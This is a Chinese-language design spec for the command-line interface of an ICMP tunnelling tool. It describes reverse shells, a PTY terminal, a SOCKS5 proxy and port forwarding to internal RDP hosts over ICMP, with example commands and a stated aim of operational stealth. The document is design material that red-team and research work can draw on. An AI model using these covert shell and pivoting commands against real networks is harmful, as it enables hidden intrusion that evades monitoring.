# ICMP 隧道命令行交互设计规范 (CLI Design Spec)

## 1. 概述 (Overview)
本文档规定了 ICMP 隧道特性的命令行接口 (CLI) 及应用层交互设计。我们的目标是提供一个统一且向下兼容的接口，使其在同一条 ICMP 物理链路上，完美支持：传统的轮询式反向 Shell、可靠的 Socks5 代理、本地端口转发，以及交互式 PTY 终端。

## 2. 命令行设计 (Master 端)

`master` 子命令将通过可选的标志位（flags）来支持隧道特性。这些参数既可以单独使用，也可以组合使用。

### 2.1 标志位 (Flags)
- `-src <ip>`: 本机源 IP 地址 (必填)
- `-dst <ip>`: 目标 IP 地址 (非 Web 模式必填)
- `-web`: 开启 Web 控制台仪表盘
- `-port <port>`: Web 控制台监听的端口
- **[新增]** `-socks <port>`: 在指定的本地端口上开启 Socks5 代理服务。(例如：`-socks 1080`)
- **[新增]** `-fwd <localPort:remoteIP:remotePort>`: 开启本地端口映射，通过 Slave 将流量转发到远程目标。(例如：`-fwd 33890:127.0.0.1:3389`)
- **[新增]** `-shell`: 开启标准的反向 Shell 交互式控制台（老版轮询模式）。
- **[新增]** `-pty`: 开启高级交互式 PTY 终端（直接进入全双工隧道模式）。

### 2.2 使用场景示例

**场景 1：纯后台代理/转发 (默认行为)**
```bash
./icmp_tool master -src 192.168.1.10 -dst 192.168.1.20 -socks 1080 -fwd 33890:127.0.0.1:3389
```
没有任何标准输入/输出的交互控制台。程序默认作为后台守护进程，静默处理 Socks5 代理和端口转发。

**场景 2：开启传统轮询 Shell**
```bash
./icmp_tool master -src 192.168.1.10 -dst 192.168.1.20 -shell
```
程序启动后会打开传统的反向 Shell 控制台（打一枪换一个地方的模式），不运行任何代理。

**场景 3：直接进入高级交互式 Shell**
```bash
./icmp_tool master -src 192.168.1.10 -dst 192.168.1.20 -pty
```
程序启动后，直接通过 ICMP 隧道建立全双工连接，拉起远端的原生 Shell (bash/cmd)，体验等同于 SSH 连接。

**场景 4：全能融合模式 (交互 Shell + Socks5 + 端口转发)**
```bash
./icmp_tool master -src 192.168.1.10 -dst 192.168.1.20 -pty -socks 1080 -fwd 33890:10.0.0.5:3389
```
前台运行高级交互式终端，后台在 1080 端口监听 Socks5 代理，在 33890 端口监听端口转发。所有的流量都在底层的 ICMP 隧道中多路复用。

## 3. 终端模式互斥逻辑

默认情况下，Master 启动时**没有前台交互控制台**（专心做代理转发）。如果需要命令行交互，可以从以下两种模式中选择其一（代理和转发参数不受影响）：
1. **传统 Shell 模式** (`-shell`)：通过发送普通的 ICMP 报文 (`ProtocolShell=1`)，单次执行命令。适用于网络环境极度苛刻、易丢包的场景。
2. **交互式 PTY 模式** (`-pty`)：Master 启动时发送隧道建连包 (`TunnelTypeSYN`)，建立长连接交互式终端。适用于需要跑复杂命令且网络较为稳定的场景。

## 4. 命令行设计 (Slave 端)

对于隧道特性，`slave` 子命令**完全不需要任何新参数**。

### 4.1 自动化的隧道处理
- Slave 仍然像以前一样，通过旧版的 `PcapPollClient` 不断轮询以获取传统 Shell 命令。
- **[新增]** Slave 会在后台启动一个 `TunnelListener`，专门监听 `ProtocolTunnel` 标志的 ICMP 回包。
- 当 Slave 收到 `TunnelTypeSYN` 建连请求时，它会读取应用层的负载数据（比如识别到是 "SOCKS5", "PORTFWD <target>" 还是 "SHELL"）。
- Slave 自动派生出对应的处理逻辑（去拨号内网目标端口，或者启动 `cmd.exe`），并将其与新创建的 `ICMPConn` 绑定。
- 这种机制确保了 Slave 的部署**保持绝对的“零配置”**，哪怕加入了复杂的隧道功能，也无需改变现有的部署习惯，最大化行动隐蔽性。
